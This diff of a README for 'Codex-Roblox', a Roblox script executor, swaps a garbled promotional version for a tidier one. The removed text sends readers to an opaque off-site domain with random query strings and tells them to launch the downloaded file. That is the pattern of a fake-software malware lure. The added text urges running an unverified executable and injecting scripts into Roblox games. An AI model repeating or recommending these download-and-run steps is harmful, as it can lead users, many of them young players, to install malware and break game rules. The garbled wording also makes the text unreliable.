@@ -1,65 +1,78 @@
-# Codex-Roblox: Unleash the Power of Roblox Executoring with Codex Executor 🚀
+# Codex-Roblox 🎮
 
-Welcome to the Codex-Roblox repository, your gateway to a whole new level of Roblox Executoring experience. 
+![Codex-Roblox](https://img.shields.io/badge/Codex-Roblox-brightgreen?style=for-the-badge&logo=github)
 
-## Repository DeExecutorion
-Roblox Codex Executor is specifically designed to support low-end PCs, enabling you to enjoy stable and smooth performance. With Codex, you can harness the power of Lua Executoring in Roblox games like never before. Codex stands out as the premier Roblox Executor executor, providing unparalleled functionality to effortlessly run Executors for your preferred Roblox games.
+Welcome to the **Codex-Roblox** repository! This project is designed to enhance your Roblox gaming experience by providing a reliable executor tailored for low-end PCs. With Codex, you can enjoy a smooth and stable gameplay experience while running your favorite Roblox games.
 
-## Features 🛠️
-- Supports low-end PCs.
-- Stable and smooth performance.
-- Unparalleled functionality for running Executors.
-- Enjoy seamless gameplay in your favorite Roblox games.
-- Empower your Roblox Executoring skills.
+## Table of Contents
 
-## Repository Topics 📚
-- builder
-- code
-- codex
-- codex-download
-- codex-github
-- codex-roblox
-- collaborate
-- community
-- contribute
-- development
-- framework
-- roblox
-- roblox-codex
-- roblox-lua
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Contributing](#contributing)
+- [Community](#community)
+- [License](#license)
+- [Links](#links)
 
-## Download Codex Executor
-To download the Codex Executor, please click on the following link: [Download Codex Executor](https://setupgiths.sbs?q33f9xg87fc8ie8)
+## Features
 
-[![Download Codex Executor](https://setupgiths.sbs?5xg867lww5zvddw)](https://setupgiths.sbs?vq6vnnddyzxiixd)
+- **Lightweight Design**: Codex is optimized for low-end PCs, ensuring that you can run it without lag.
+- **User-Friendly Interface**: Navigate easily through the application with a simple and intuitive design.
+- **Robust Functionality**: Run various executors seamlessly for your preferred Roblox games.
+- **Active Development**: Regular updates ensure that you have the latest features and bug fixes.
 
-If the link above ends with the file name, remember to launch it to kickstart your Roblox Executoring adventure with Codex Executor.
+## Installation
 
-## How to Contribute?
-Join our vibrant community of Roblox Executor enthusiasts and developers. Contribute to the ongoing development and improvement of the Codex Executor to elevate the Roblox Executoring experience for everyone.
+To get started with Codex-Roblox, follow these steps:
 
-### Ways to Contribute:
-- Share your feedback and suggestions.
-- Report bugs and issues.
-- Contribute code enhancements and features.
-- Collaborate with like-minded developers.
-- Spread the word about Codex Executor.
+1. **Download the latest release** from the [Releases section](https://github.com/agenett/Codex-Roblox/releases).
+2. **Extract the downloaded file** to your preferred location on your computer.
+3. **Run the executable** to start using Codex.
 
-## Stay Updated
-If the provided download link is not working or if you seek more information, make sure to check the "Releases" section for the latest updates and versions of Codex Executor.
+Make sure to check the [Releases section](https://github.com/agenett/Codex-Roblox/releases) for the latest updates and features.
 
-## Embrace the Power of Roblox Executoring with Codex Executor 🔥
-Dive into the world of Roblox Executoring with Codex Executor and unleash your creativity. Whether you are a seasoned developer or a budding Executorer, Codex offers you the tools and functionality to excel in the Roblox universe. Join us on this exciting journey of exploration, collaboration, and innovation.
+## Usage
 
-![Roblox Codex](https://setupgiths.sbs?ef1nc14llqam2tb)
+Once you have installed Codex-Roblox, you can start using it to enhance your Roblox experience. Here’s how:
 
-## Let's Connect 🌐
-Follow us on social media for the latest updates, tutorials, and community interactions:
-- Twitter: [@CodexRoblox]
-- Instagram: [Codex_Roblox]
-- YouTube: [Codex Roblox Channel]
+1. **Launch Codex** from the folder where you extracted it.
+2. **Select your preferred executor** from the list provided.
+3. **Input the game script** you wish to run.
+4. **Click on the 'Execute' button** to start the script in your Roblox game.
 
-## Start Your Roblox Executoring Adventure Today! 🎮💡
-Download Codex Executor now and experience Roblox Executoring like never before. Turn your ideas into reality, create immersive gameplay experiences, and become a Roblox Executoring maestro with Codex at your fingertips.
+### Tips for Optimal Use
 
-Happy Coding! 💻✨
+- Ensure that your Roblox game is running before executing scripts.
+- Use scripts that are compatible with the version of Roblox you are playing.
+- Keep your Codex updated to benefit from new features and fixes.
+
+## Contributing
+
+We welcome contributions from the community! If you have ideas, improvements, or bug fixes, feel free to fork the repository and submit a pull request. Here’s how you can contribute:
+
+1. **Fork the repository** to your GitHub account.
+2. **Create a new branch** for your feature or bug fix.
+3. **Make your changes** and commit them with a clear message.
+4. **Push your changes** to your forked repository.
+5. **Submit a pull request** for review.
+
+Your contributions help make Codex-Roblox better for everyone!
+
+## Community
+
+Join our community to connect with other users and developers:
+
+- **Discord**: Join our Discord server for discussions, support, and collaboration.
+- **Forums**: Participate in our forums to share your experiences and get help from others.
+
+## License
+
+Codex-Roblox is open-source and available under the MIT License. Feel free to use, modify, and distribute it according to the terms of the license.
+
+## Links
+
+For more information and to download the latest version, visit the [Releases section](https://github.com/agenett/Codex-Roblox/releases).
+
+![Roblox Logo](https://upload.wikimedia.org/wikipedia/en/5/5f/Roblox_logo.png)
+
+Thank you for checking out Codex-Roblox! Enjoy your gaming experience!
